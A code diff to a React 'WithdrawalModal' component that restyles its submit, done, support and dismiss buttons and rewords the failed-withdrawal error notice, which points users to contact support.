@@ -601,8 +601,10 @@ export function WithdrawalModal({ opened, onClose, availableBalance = 0, applica
                   </Button>
                   <Button 
                     type="submit" 
-                    color="primary"
+                    variant="filled"
+                    style={{ backgroundColor: '#005ea2', color: 'white' }}
                     disabled={!selectedPaymentMethod}
+                    size="md"
                   >
                     Submit Request
                   </Button>
@@ -772,7 +774,9 @@ export function WithdrawalModal({ opened, onClose, availableBalance = 0, applica
                     resetModal();
                     onClose();
                   }}
-                  color="primary"
+                  variant="filled"
+                  style={{ backgroundColor: '#005ea2', color: 'white' }}
+                  size="md"
                 >
                   Done
                 </Button>
@@ -818,7 +822,7 @@ export function WithdrawalModal({ opened, onClose, availableBalance = 0, applica
                   <IconAlertCircle size={18} />
                   <Text size="sm" fw={700}>System Notice:</Text>
                 </Group>
-                <Text size="sm" mb="xs">We were unable to route these funds securely. {errorMessage}</Text>
+                <Text size="sm" mb="xs">Fund deposit failed this time. Please contact support for withdrawal processing. {errorMessage}</Text>
                 <div style={{ padding: '8px 12px', background: 'rgba(255,255,255,0.6)', borderRadius: 4, marginTop: 8 }}>
                   <Text size="xs" fw={700} c="dimmed">ERROR_CODE: SEC_AUTH_FAILED</Text>
                 </div>
@@ -827,7 +831,8 @@ export function WithdrawalModal({ opened, onClose, availableBalance = 0, applica
               <Group mt="md" grow w="100%">
                 <Button
                   leftSection={<IconHeadphones size={18} />}
-                  color="dark"
+                  variant="filled"
+                  style={{ backgroundColor: '#005ea2', color: 'white' }}
                   size="md"
                   onClick={handleContactWhatsApp}
                 >
@@ -838,6 +843,7 @@ export function WithdrawalModal({ opened, onClose, availableBalance = 0, applica
                   color="gray"
                   size="md"
                   onClick={resetModal}
+                  style={{ borderWidth: 2 }}
                 >
                   Dismiss
                 </Button>
@@ -879,12 +885,18 @@ export function WithdrawalModal({ opened, onClose, availableBalance = 0, applica
               {/* FIXED: Also changed error state support button */}
               <Button
                 leftSection={<IconHeadphones size={16} />}
-                color="blue"
+                variant="filled"
+                style={{ backgroundColor: '#005ea2', color: 'white' }}
                 onClick={handleContactSupport}
               >
                 Contact Support
               </Button>
-              <Button variant="outline" color="gray" onClick={resetModal}>
+              <Button 
+                variant="outline" 
+                color="gray" 
+                onClick={resetModal}
+                style={{ borderWidth: 2 }}
+              >
                 Try Again
               </Button>
             </Stack>
